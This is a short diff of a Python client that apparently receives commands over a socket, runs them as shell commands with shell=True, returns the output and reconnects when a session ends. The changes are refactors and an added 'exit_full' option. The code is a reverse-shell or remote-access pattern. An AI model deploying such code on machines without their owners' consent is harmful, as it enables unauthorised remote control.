@@ -16,9 +16,11 @@ def run_custom_command(cmd: str) -> CommandPayload:
     global exit_flag
 
     result = CommandPayload()
-    if cmd[1] == "exit":
+    if cmd[1] == "exit" or cmd[1] == "exit_full":
         exit_flag = True
         result.stdout = "Session ended"
+        if cmd[1] == "exit_full":
+            exit(0)
     elif cmd[1] == "file":
         file_name = cmd[2]
         try:
@@ -72,9 +74,7 @@ def create_socket():
             payload = run_custom_command(command)
         else:
             # Generate command
-            result = run_command(command)
-            payload = CommandPayload(stdout=result[0], stderr=result[1])
-
+            payload = run_command(command)
         print(payload)
         packet = payload.pack()
 
@@ -83,8 +83,10 @@ def create_socket():
             create_socket()
 
         if exit_flag:
+            print(exit_flag)
             secure_socket.close()
             create_socket()
+
 
 
 # Run a line of shell command and returns the result
@@ -101,7 +103,8 @@ def run_command(cmd):
         cmd = " ".join(cmd)
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
-    return result
+    payload = CommandPayload(stdout=result[0], stderr=result[1])
+    return payload
 
 
 def main():
